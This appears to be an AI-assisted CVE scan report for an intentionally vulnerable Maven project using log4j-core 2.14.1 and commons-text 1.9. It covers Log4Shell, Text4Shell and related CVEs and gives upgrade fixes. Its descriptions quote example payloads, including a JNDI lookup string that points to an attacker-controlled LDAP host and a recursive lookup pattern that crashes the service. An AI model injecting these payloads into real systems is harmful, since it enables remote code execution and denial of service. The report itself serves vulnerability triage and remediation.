# CVE Analysis Report — 01_direct_vuln_n1

**Scan Date:** 2026-04-03  
**Tool:** GitHub Copilot + appmod-validate-cves-for-java (GitHub Security Advisories)  
**Total CVEs Found:** 6  
**Severities:** 3 CRITICAL · 1 HIGH · 2 MEDIUM

---

## Project Description

Aplicación Maven con **vulnerabilidades directas de nivel N1** (dependencias directas). Contiene `log4j-core:2.14.1` y `commons-text:1.9` declarados explícitamente en `pom.xml`, ambos con CVEs de alto impacto conocidos públicamente.

---

## Dependency Summary

| Artifact | Version | Level | CVE Count |
|---|---|---|---|
| `log4j-core` | 2.14.1 | N1 (directo) | 5 |
| `commons-text` | 1.9 | N1 (directo) | 1 |

---

## CVE Detail

### org.apache.logging.log4j : log4j-core : 2.14.1

#### CVE-2021-44228 — CRITICAL — RCE via JNDI (Log4Shell)
- **Tipo:** Remote Code Execution (RCE)
- **Descripción:** La función de lookup de JNDI en Log4j2 permite que un atacante que controle un mensaje de log ejecute código arbitrario en el servidor. El atacante envía una cadena del tipo `${jndi:ldap://attacker.com/a}` que es evaluada por Log4j, provocando una conexión a un servidor LDAP controlado que retorna bytecode Java malicioso.
- **Impacto:** Ejecución de código arbitrario con los privilegios del proceso Java. Crítico en aplicaciones web que logueen entradas de usuario.
- **Remediación:** Actualizar a `log4j-core:2.25.3`. En versiones intermedias, desabilitar JNDI lookups con `-Dlog4j2.formatMsgNoLookups=true`.
- **Referencia:** https://github.com/advisories/GHSA-jfh8-c2jp-5v3q

#### CVE-2021-45046 — CRITICAL — RCE via JNDI (bypass de fix)
- **Tipo:** Remote Code Execution (RCE)
- **Descripción:** El fix inicial para CVE-2021-44228 fue incompleto. En entornos con Thread Context Map (MDC) configurado con lookup enabled, un atacante puede construir un pattern de lookup alternativo para ejecutar JNDI lookup en endpoints TCP/UDP además de LDAP.
- **Impacto:** RCE en sistemas que aplicaron solo el parche de `formatMsgNoLookups`. Afecta versiones 2.0-beta9 hasta 2.15.0.
- **Remediación:** Actualizar a `log4j-core:2.25.3`.
- **Referencia:** https://github.com/advisories/GHSA-7rjr-3q55-vv33

#### CVE-2021-45105 — HIGH — DoS via recursion infinita
- **Tipo:** Denial of Service (DoS)
- **Descripción:** Log4j2 no protege contra recursión infinita en self-referential lookups. Un atacante con control sobre entradas de log puede incluir un pattern como `${${::-${::-$${::-j}}}` para provocar stack overflow y causar una excepción `StackOverflowError`.
- **Impacto:** Crash de la JVM, interrupción del servicio.
- **Remediación:** Actualizar a `log4j-core:2.25.3`.
- **Referencia:** https://github.com/advisories/GHSA-p6xc-xr62-6r2g

#### CVE-2021-44832 — MEDIUM — RCE via JDBC Appender
- **Tipo:** Remote Code Execution (RCE) con prerequisito de acceso a configuración
- **Descripción:** Si un atacante tiene capacidad de modificar el archivo de configuración de Log4j, puede configurar el JDBC Appender con una URL JNDI para lograr RCE. Requiere acceso previo al sistema de archivos o mecanismo de recarga de configuración.
- **Impacto:** RCE condicionado a compromiso previo de la configuración.
- **Remediación:** Actualizar a `log4j-core:2.25.3`.
- **Referencia:** https://github.com/advisories/GHSA-8489-44mv-ggj8

#### CVE-2025-68161 — MEDIUM — TLS Hostname Bypass en Socket Appender
- **Tipo:** Man-in-the-Middle (MiTM)
- **Descripción:** El Socket Appender de Log4j2 no realiza verificación del hostname del certificado TLS al conectarse a un servidor de log remoto. Esto permite un ataque MITM donde un intermediario puede interceptar o modificar los eventos de log.
- **Impacto:** Exposición de logs a terceros no autorizados; posible inyección de datos falsos en el sistema de logging.
- **Remediación:** Actualizar a `log4j-core:2.25.3`.
- **Referencia:** https://github.com/advisories/GHSA-vc5p-v9hr-52mj

---

### org.apache.commons : commons-text : 1.9

#### CVE-2022-42889 — CRITICAL — RCE via interpolación de variables (Text4Shell)
- **Tipo:** Remote Code Execution (RCE)
- **Descripción:** La clase `StringSubstitutor` de Commons Text evalúa interpolaciones de variables que incluyen prefijos peligrosos como `${script:...}`, `${dns:...}` y `${url:...}`. Si la entrada del usuario es procesada por `StringSubstitutor.replace()`, un atacante puede ejecutar código arbitrario via script engine, realizar DNS lookups o acceder a URLs remotas.
- **Impacto:** RCE en cualquier aplicación que pase input no sanitizado a `StringSubstitutor`. Análogo a Log4Shell pero en Commons Text.
- **Remediación:** Actualizar a `commons-text:1.10.0` que deshabilita los prefijos peligrosos por defecto.
- **Referencia:** https://github.com/advisories/GHSA-599f-7c49-w659

---

## Remediation Summary

| Dependency | Current Version | Fix Version |
|---|---|---|
| `log4j-core` | 2.14.1 | **2.25.3** |
| `commons-text` | 1.9 | **1.10.0** |

---

## AI Analysis Notes

Este proyecto es ideal como **caso de estudio de vulnerabilidades directas (N1)**. Ambas dependencias son famosas por sus CVEs críticos de alta difusión:
- Log4Shell (CVE-2021-44228) fue el CVE más explotado de 2021-2022.
- Text4Shell (CVE-2022-42889) siguió el mismo patrón de interpolación pero con menor impacto real.
- El patrón de vulnerabilidad es **interpolación de strings controlados por el atacante** en contextos de evaluación (JNDI, scripting).
- Punto de entrada: cualquier log de request HTTP, headers, parámetros de URL o campos de formulario.
